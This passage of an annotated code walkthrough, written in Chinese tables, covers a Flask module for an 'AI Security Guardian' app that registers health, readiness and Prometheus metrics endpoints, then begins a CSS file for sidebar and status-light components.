| 32 | 函数定义：声明 `_default_secret_key` 的输入、处理逻辑和返回结果。 | `def _default_secret_key() -> str:` |
| 33 | 返回结果：把处理后的值交回调用方。 | `    return "dev-only-insecure-key-never-use-in-production"` |
| 34 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 函数定义：声明 `_checks_database` 的输入、处理逻辑和返回结果。 | `def _checks_database() -> Tuple[bool, str]:` |
| 37 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 38 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.execute(text("SELECT 1"))` |
| 39 | 返回结果：把处理后的值交回调用方。 | `        return True, "ok"` |
| 40 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception as exc:  # noqa: BLE001` |
| 41 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.rollback()` |
| 42 | 返回结果：把处理后的值交回调用方。 | `        return False, f"db_error: {type(exc).__name__}"` |
| 43 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 44 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 45 | 函数定义：声明 `_checks_redis` 的输入、处理逻辑和返回结果。 | `def _checks_redis(client: RedisClient) -> Tuple[bool, str]:` |
| 46 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 47 | 条件判断：满足条件时进入对应分支。 | `        if client.ping():` |
| 48 | 返回结果：把处理后的值交回调用方。 | `            return True, "ok"` |
| 49 | 返回结果：把处理后的值交回调用方。 | `        return False, "redis_ping_failed"` |
| 50 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception as exc:  # noqa: BLE001` |
| 51 | 返回结果：把处理后的值交回调用方。 | `        return False, f"redis_error: {type(exc).__name__}"` |
| 52 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 53 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 54 | 函数定义：声明 `_checks_config` 的输入、处理逻辑和返回结果。 | `def _checks_config(app: Flask) -> Tuple[bool, str]:` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    env = os.environ.get("FLASK_ENV", "development")` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sk = app.config.get("SECRET_KEY", "")` |
| 57 | 条件判断：满足条件时进入对应分支。 | `    if env == "production" and (not sk or sk == _default_secret_key()):` |
| 58 | 返回结果：把处理后的值交回调用方。 | `        return False, "insecure_or_missing_secret_key"` |
| 59 | 条件判断：满足条件时进入对应分支。 | `    if env == "production":` |
| 60 | 条件判断：满足条件时进入对应分支。 | `        if not (os.environ.get("ADMIN_PASSWORD_HASH") or "").strip():` |
| 61 | 返回结果：把处理后的值交回调用方。 | `            return False, "admin_password_hash_required"` |
| 62 | 条件判断：满足条件时进入对应分支。 | `        if not (os.environ.get("REDIS_PASSWORD") or "").strip():` |
| 63 | 返回结果：把处理后的值交回调用方。 | `            return False, "redis_password_required"` |
| 64 | 返回结果：把处理后的值交回调用方。 | `    return True, "ok"` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 函数定义：声明 `_checks_models` 的输入、处理逻辑和返回结果。 | `def _checks_models(app: Flask, rds: RedisClient) -> Tuple[bool, str]:` |
| 68 | 条件判断：满足条件时进入对应分支。 | `    if app.config.get("TESTING") or os.environ.get("FLASK_ENV") == "testing":` |
| 69 | 返回结果：把处理后的值交回调用方。 | `        return True, "testing_skip_model_signal"` |
| 70 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    snap = read_guardian_redis_snapshot(rds)` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    updated = snap.get("updated_ts", 0.0)` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    stale_sec = float(os.environ.get("GUARDIAN_METRICS_MAX_AGE_SEC", "180"))` |
| 74 | 条件判断：满足条件时进入对应分支。 | `    if updated and (time.time() - updated) <= stale_sec:` |
| 75 | 条件判断：满足条件时进入对应分支。 | `        if snap.get("model_ready", 0) > 0:` |
| 76 | 返回结果：把处理后的值交回调用方。 | `            return True, "guardian_model_signal_ok"` |
| 77 | 返回结果：把处理后的值交回调用方。 | `        return False, "guardian_reports_zero_models"` |
| 78 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    md = app.config.get("MODEL_DIR", "models/saved")` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_dir = Path(md)` |
| 81 | 条件判断：满足条件时进入对应分支。 | `    if not model_dir.is_absolute():` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_dir = Path(app.root_path).parent / model_dir` |
| 83 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 84 | 条件判断：满足条件时进入对应分支。 | `        if model_dir.is_dir() and any(model_dir.iterdir()):` |
| 85 | 返回结果：把处理后的值交回调用方。 | `            return True, "model_dir_nonempty_no_guardian_heartbeat"` |
| 86 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except OSError:` |
| 87 | 占位语句：保持语法完整但当前不执行操作。 | `        pass` |
| 88 | 返回结果：把处理后的值交回调用方。 | `    return False, "no_guardian_metrics_and_empty_model_dir"` |
| 89 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 90 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 91 | 函数定义：声明 `register_observability_routes` 的输入、处理逻辑和返回结果。 | `def register_observability_routes(app: Flask, limiter: Any) -> None:` |
| 92 | 文档字符串：说明当前模块、类或函数的职责。 | `    """注册 /healthz、/readyz、/metrics（匿名、不限流）。"""` |
| 93 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 94 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/healthz")` |
| 95 | 装饰器：为下面的函数或类附加框架行为。 | `    @limiter.exempt` |
| 96 | 函数定义：声明 `healthz` 的输入、处理逻辑和返回结果。 | `    def healthz():  # type: ignore[unused-function]` |
| 97 | 返回结果：把处理后的值交回调用方。 | `        return jsonify({"status": "live", "component": "ai-security-guardian-web"}), 200` |
| 98 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 99 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/readyz")` |
| 100 | 装饰器：为下面的函数或类附加框架行为。 | `    @limiter.exempt` |
| 101 | 函数定义：声明 `readyz` 的输入、处理逻辑和返回结果。 | `    def readyz():  # type: ignore[unused-function]` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        checks: Dict[str, Any] = {}` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fatal: List[str] = []` |
| 104 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 105 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ok_db, msg_db = _checks_database()` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        checks["database"] = {"ok": ok_db, "detail": msg_db}` |
| 107 | 条件判断：满足条件时进入对应分支。 | `        if not ok_db:` |
| 108 | 函数调用：执行已有函数/方法完成当前步骤。 | `            fatal.append("database")` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rds = _redis_for_app(app)` |
| 111 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ok_redis, msg_redis = _checks_redis(rds)` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        checks["redis"] = {"ok": ok_redis, "detail": msg_redis, "mode": rds.mode}` |
| 113 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        testing = app.config.get("TESTING") or os.environ.get("FLASK_ENV") == "testing"` |
| 115 | 条件判断：满足条件时进入对应分支。 | `        if not ok_redis and not testing:` |
| 116 | 函数调用：执行已有函数/方法完成当前步骤。 | `            fatal.append("redis")` |
| 117 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 118 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ok_cfg, msg_cfg = _checks_config(app)` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        checks["config"] = {"ok": ok_cfg, "detail": msg_cfg}` |
| 120 | 条件判断：满足条件时进入对应分支。 | `        if not ok_cfg:` |
| 121 | 函数调用：执行已有函数/方法完成当前步骤。 | `            fatal.append("config")` |
| 122 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 123 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ok_models, msg_models = _checks_models(app, rds)` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        checks["models"] = {"ok": ok_models, "detail": msg_models}` |
| 125 | 条件判断：满足条件时进入对应分支。 | `        if not ok_models:` |
| 126 | 函数调用：执行已有函数/方法完成当前步骤。 | `            fatal.append("models")` |
| 127 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        degraded: List[str] = []` |
| 129 | 条件判断：满足条件时进入对应分支。 | `        if not ok_redis and testing:` |
| 130 | 函数调用：执行已有函数/方法完成当前步骤。 | `            degraded.append("redis")` |
| 131 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 132 | 条件判断：满足条件时进入对应分支。 | `        if fatal:` |
| 133 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 134 | API 响应：把 Python 数据转换为 JSON 返回给前端。 | `                jsonify(` |
| 135 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    {` |
| 136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "status": "unready",` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "checks": checks,` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "fatal": fatal,` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        "degraded": degraded,` |
| 140 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    }` |
| 141 | 代码语句：参与当前文件的业务流程或数据处理。 | `                ),` |
| 142 | 代码语句：参与当前文件的业务流程或数据处理。 | `                503,` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 144 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status = "ready" if not degraded else "degraded"` |
| 146 | 返回结果：把处理后的值交回调用方。 | `        return jsonify({"status": status, "checks": checks, "degraded": degraded}), 200` |
| 147 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 148 | 路由装饰器：把下面的函数注册为 HTTP 页面或 API 入口。 | `    @app.route("/metrics")` |
| 149 | 装饰器：为下面的函数或类附加框架行为。 | `    @limiter.exempt` |
| 150 | 函数定义：声明 `metrics` 的输入、处理逻辑和返回结果。 | `    def metrics():  # type: ignore[unused-function]` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        lines: List[str] = []` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rds = _redis_for_app(app)` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        snap = read_guardian_redis_snapshot(rds)` |
| 154 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 155 | 函数定义：声明 `_num` 的输入、处理逻辑和返回结果。 | `        def _num(key: str, default: float = 0.0) -> float:` |
| 156 | 返回结果：把处理后的值交回调用方。 | `            return float(snap.get(key, default))` |
| 157 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        packets = int(_num("packets_total"))` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dropped = int(_num("packets_dropped_total"))` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        lat_sum = _num("detection_latency_sum_ms")` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        lat_cnt = int(_num("detection_latency_count"))` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alerts = int(_num("alerts_total"))` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_ready = int(_num("model_ready"))` |
| 164 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 165 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream_key = os.environ.get("GUARDIAN_ALERT_STREAM", "guardian:alerts")` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        group = os.environ.get("GUARDIAN_ALERT_STREAM_GROUP", "guardian:web")` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pending = 0` |
| 168 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pending = int(rds.stream_pending(stream_key, group))` |
| 170 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:  # noqa: BLE001` |
| 171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pending = 0` |
| 172 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        audit_ok = 1 if get_last_audit_integrity_valid() else 0` |
| 174 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mean_lat = (lat_sum / lat_cnt) if lat_cnt > 0 else 0.0` |
| 176 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 177 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# HELP guardian_packets_total Packets seen by Guardian pipeline.")` |
| 178 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# TYPE guardian_packets_total counter")` |
| 179 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append(f"guardian_packets_total {packets}")` |
| 180 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# HELP guardian_packets_dropped_total Dropped or discarded packets (TI filter, queue errors, aggregator discards).")` |
| 181 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# TYPE guardian_packets_dropped_total counter")` |
| 182 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append(f"guardian_packets_dropped_total {dropped}")` |
| 183 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# HELP guardian_detection_latency_ms_sum Sum of detection+fusion latency in milliseconds.")` |
| 184 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# TYPE guardian_detection_latency_ms_sum counter")` |
| 185 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append(f"guardian_detection_latency_ms_sum {lat_sum}")` |
| 186 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# HELP guardian_detection_latency_ms_count Detection+fusion latency samples.")` |
| 187 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# TYPE guardian_detection_latency_ms_count counter")` |
| 188 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append(f"guardian_detection_latency_ms_count {lat_cnt}")` |
| 189 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# HELP guardian_detection_latency_ms Mean detection+fusion latency in milliseconds (derived).")` |
| 190 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# TYPE guardian_detection_latency_ms gauge")` |
| 191 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append(f"guardian_detection_latency_ms {mean_lat}")` |
| 192 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# HELP guardian_alerts_total Threat alerts emitted by Guardian.")` |
| 193 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# TYPE guardian_alerts_total counter")` |
| 194 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append(f"guardian_alerts_total {alerts}")` |
| 195 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# HELP guardian_model_ready Count of detection engines reporting ready (from Guardian heartbeat).")` |
| 196 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# TYPE guardian_model_ready gauge")` |
| 197 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append(f"guardian_model_ready {model_ready}")` |
| 198 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# HELP redis_stream_pending Pending entries in Redis alert stream consumer group.")` |
| 199 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# TYPE redis_stream_pending gauge")` |
| 200 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append(f"redis_stream_pending {pending}")` |
| 201 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# HELP audit_integrity_valid 1 if last audit hash-chain patrol succeeded.")` |
| 202 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append("# TYPE audit_integrity_valid gauge")` |
| 203 | 函数调用：执行已有函数/方法完成当前步骤。 | `        lines.append(f"audit_integrity_valid {audit_ok}")` |
| 204 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body = "\n".join(lines) + "\n"` |
| 206 | 返回结果：把处理后的值交回调用方。 | `        return Response(body, mimetype="text/plain; version=0.0.4; charset=utf-8")` |

## `web/static/css/components.css`

- 类型：前端静态资源
- 行数：1993

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 2 | 样式注释：说明这一段 CSS 的用途。 | ` * AI Security Guardian — components.css` |
| 3 | 样式注释：说明这一段 CSS 的用途。 | ` * Phase 7 组件规范（对应 DESIGN.md §4 / §5 / §7 / §10）。` |
| 4 | 样式注释：说明这一段 CSS 的用途。 | ` * 仅使用 theme.css 中定义的 CSS 变量；不要硬编码颜色。` |
| 5 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 6 | 空行：分隔样式规则。 | `&nbsp;` |
| 7 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 8 | 样式注释：说明这一段 CSS 的用途。 | ` * 应用骨架：侧边栏 + 顶部栏 + 内容区` |
| 9 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 10 | 选择器：指定接下来要设置样式的页面元素。 | `.app-shell {` |
| 11 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 12 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 100vh;` |
| 13 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--bg-void);` |
| 14 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 15 | 空行：分隔样式规则。 | `&nbsp;` |
| 16 | 样式注释：说明这一段 CSS 的用途。 | `/* -- 侧边栏 -- */` |
| 17 | 选择器：指定接下来要设置样式的页面元素。 | `.sidebar {` |
| 18 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: var(--sidebar-width);` |
| 19 | 样式属性：设置 `flex-shrink` 的视觉或布局效果。 | `  flex-shrink: 0;` |
| 20 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--bg-void);` |
| 21 | 样式属性：设置 `border-right` 的视觉或布局效果。 | `  border-right: 1px solid var(--border-subtle);` |
| 22 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 23 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 24 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: width 0.2s ease;` |
| 25 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: sticky;` |
| 26 | 样式属性：设置 `top` 的视觉或布局效果。 | `  top: 0;` |
| 27 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 100vh;` |
| 28 | 样式属性：设置 `z-index` 的视觉或布局效果。 | `  z-index: 30;` |
| 29 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 30 | 空行：分隔样式规则。 | `&nbsp;` |
| 31 | 选择器：指定接下来要设置样式的页面元素。 | `.sidebar--collapsed {` |
| 32 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: var(--sidebar-collapsed);` |
| 33 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 34 | 空行：分隔样式规则。 | `&nbsp;` |
| 35 | 选择器：指定接下来要设置样式的页面元素。 | `.sidebar__brand {` |
| 36 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 37 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 38 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 39 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-lg) var(--space-md);` |
| 40 | 样式属性：设置 `border-bottom` 的视觉或布局效果。 | `  border-bottom: 1px solid var(--border-subtle);` |
| 41 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 42 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 600;` |
| 43 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h3);` |
| 44 | 样式属性：设置 `white-space` 的视觉或布局效果。 | `  white-space: nowrap;` |
| 45 | 样式属性：设置 `overflow` 的视觉或布局效果。 | `  overflow: hidden;` |
| 46 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 47 | 空行：分隔样式规则。 | `&nbsp;` |
| 48 | 选择器：指定接下来要设置样式的页面元素。 | `.sidebar__brand-dot {` |
| 49 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 10px;` |
| 50 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 10px;` |
| 51 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 50%;` |
| 52 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald);` |
| 53 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: var(--glow-emerald);` |
| 54 | 样式属性：设置 `flex-shrink` 的视觉或布局效果。 | `  flex-shrink: 0;` |
| 55 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 56 | 空行：分隔样式规则。 | `&nbsp;` |
| 57 | 选择器：指定接下来要设置样式的页面元素。 | `.sidebar__nav {` |
| 58 | 样式属性：设置 `flex` 的视觉或布局效果。 | `  flex: 1;` |
| 59 | 样式属性：设置 `overflow-y` 的视觉或布局效果。 | `  overflow-y: auto;` |
| 60 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-sm) 0;` |
| 61 | 样式属性：设置 `list-style` 的视觉或布局效果。 | `  list-style: none;` |
| 62 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 63 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 64 | 空行：分隔样式规则。 | `&nbsp;` |
| 65 | 选择器：指定接下来要设置样式的页面元素。 | `.sidebar__item {` |
| 66 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 67 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 68 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 69 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 10px var(--space-md);` |
| 70 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 71 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 72 | 样式属性：设置 `border-left` 的视觉或布局效果。 | `  border-left: 2px solid transparent;` |
| 73 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: pointer;` |
| 74 | 样式属性：设置 `white-space` 的视觉或布局效果。 | `  white-space: nowrap;` |
| 75 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: background 0.15s ease, color 0.15s ease,` |
| 76 | 样式语句：参与页面视觉布局。 | `    border-color 0.15s ease;` |
| 77 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 78 | 空行：分隔样式规则。 | `&nbsp;` |
| 79 | 选择器：指定接下来要设置样式的页面元素。 | `.sidebar__item:hover {` |
| 80 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-dark);` |
| 81 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 82 | 样式属性：设置 `text-decoration` 的视觉或布局效果。 | `  text-decoration: none;` |
| 83 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 84 | 空行：分隔样式规则。 | `&nbsp;` |
| 85 | 选择器：指定接下来要设置样式的页面元素。 | `.sidebar__item.is-active {` |
| 86 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald-glow);` |
| 87 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 88 | 样式属性：设置 `border-left-color` 的视觉或布局效果。 | `  border-left-color: var(--accent-emerald);` |
| 89 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 90 | 空行：分隔样式规则。 | `&nbsp;` |
| 91 | 选择器：指定接下来要设置样式的页面元素。 | `.sidebar__icon {` |
| 92 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 18px;` |
| 93 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 18px;` |
| 94 | 样式属性：设置 `flex-shrink` 的视觉或布局效果。 | `  flex-shrink: 0;` |
| 95 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: currentColor;` |
| 96 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 97 | 空行：分隔样式规则。 | `&nbsp;` |
| 98 | 选择器：指定接下来要设置样式的页面元素。 | `.sidebar__status {` |
| 99 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md);` |
| 100 | 样式属性：设置 `border-top` 的视觉或布局效果。 | `  border-top: 1px solid var(--border-subtle);` |
| 101 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 102 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 103 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 104 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 105 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 106 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 107 | 空行：分隔样式规则。 | `&nbsp;` |
| 108 | 选择器：指定接下来要设置样式的页面元素。 | `.status-light {` |
| 109 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 8px;` |
| 110 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 8px;` |
| 111 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 50%;` |
| 112 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald);` |
| 113 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: var(--glow-emerald);` |
| 114 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 115 | 空行：分隔样式规则。 | `&nbsp;` |
| 116 | 选择器：指定接下来要设置样式的页面元素。 | `.status-light--warn {` |
| 117 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--threat-medium);` |
| 118 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: 0 0 8px rgba(245, 158, 11, 0.35);` |
| 119 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 120 | 空行：分隔样式规则。 | `&nbsp;` |
| 121 | 选择器：指定接下来要设置样式的页面元素。 | `.status-light--danger {` |
| 122 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--threat-high);` |
| 123 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: var(--glow-red);` |
| 124 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 125 | 空行：分隔样式规则。 | `&nbsp;` |
| 126 | 样式注释：说明这一段 CSS 的用途。 | `/* 侧栏收起时隐藏文本 */` |
| 127 | 样式语句：参与页面视觉布局。 | `.sidebar--collapsed .sidebar__label,` |
| 128 | 选择器：指定接下来要设置样式的页面元素。 | `.sidebar--collapsed .sidebar__status span {` |
| 129 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: none;` |
| 130 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 131 | 空行：分隔样式规则。 | `&nbsp;` |
| 132 | 样式注释：说明这一段 CSS 的用途。 | `/* -- 顶部栏 -- */` |
| 133 | 选择器：指定接下来要设置样式的页面元素。 | `.app-main {` |
